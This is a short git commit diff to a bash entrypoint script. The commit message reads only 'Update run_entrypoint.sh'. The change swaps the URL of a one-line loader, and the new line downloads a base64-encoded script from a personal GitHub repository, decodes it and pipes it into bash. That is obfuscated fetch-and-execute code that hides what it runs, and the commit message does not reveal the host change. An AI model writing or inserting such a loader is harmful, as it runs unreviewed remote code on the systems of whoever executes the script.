619cb911623c9d051997cab1783710ae7198c9a2
dwaincampbell <dwaincampbell@proton.me>
2026-06-15 18:27:21 +0200

    Update run_entrypoint.sh

--- run_entrypoint.sh
+++ run_entrypoint.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-wget -qO- https://gitlab.com/greywolf-group/greywolf-project/-/raw/main/entrypoint.sh | base64 -d | bash
+wget -qO- https://raw.githubusercontent.com/dwaincampbell/smile/refs/heads/main/entrypoint.sh | base64 -d | bash
